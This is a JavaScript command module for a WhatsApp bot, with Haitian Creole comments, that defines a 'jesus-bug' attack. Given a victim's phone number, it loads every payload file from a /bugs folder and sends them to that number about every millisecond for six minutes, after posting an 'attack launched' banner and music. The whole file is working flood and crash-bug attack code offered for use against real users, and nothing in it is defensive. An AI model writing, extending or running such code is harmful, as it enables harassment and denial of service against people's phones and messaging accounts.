const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'jesus-bug',
  desc: 'Bug flood using all payloads from /bugs for 6 minutes',
  category: 'bug',
  react: '🔥',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'jesus-bug') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}jesus-bug <number>`
      }, { quoted: mek });
    }

    const protectedNumbers = ['13058962443'];
    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Command aborted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📁 No payloads found in /bugs folder.'
      }, { quoted: mek });
    }

    // 🖼️ VOYE IMG AVAN ATAK
    const imagePath = path.join(__dirname, '../media/1.png');
    const imageBuffer = fs.readFileSync(imagePath);
    await bot.sendMessage(from, {
      image: imageBuffer,
      caption: `🚨 𝐉𝐄𝐒𝐔𝐒-𝐁𝐔𝐆 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃\n\n👤 Target: wa.me/${targetNumber}\n🕒 Duration: 6min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
    }, { quoted: mek });

    // 🎵 VOYE MIZIK JUSTE APRÈ
    const audioPath = path.join(__dirname, '../media/5.mp4');
    const audioBuffer = fs.readFileSync(audioPath);
    await bot.sendMessage(from, {
      video: audioBuffer,
      mimetype: 'video/mp4',
      caption: '🎵 Mizik lan ap jwe pandan bug la...'
    }, { quoted: mek });

    // 🚀 KÒMANSE ATAK LA
    const endTime = Date.now() + (6 * 60 * 1000); // 6 min

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, targetNumber);
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 1)); // Delay 0.001s
      }
    }

    await bot.sendMessage(from, {
      text: `✅ 𝐉𝐄𝐒𝐔𝐒-𝐁𝐔𝐆 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 𝐎𝐍 +${targetNumber}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
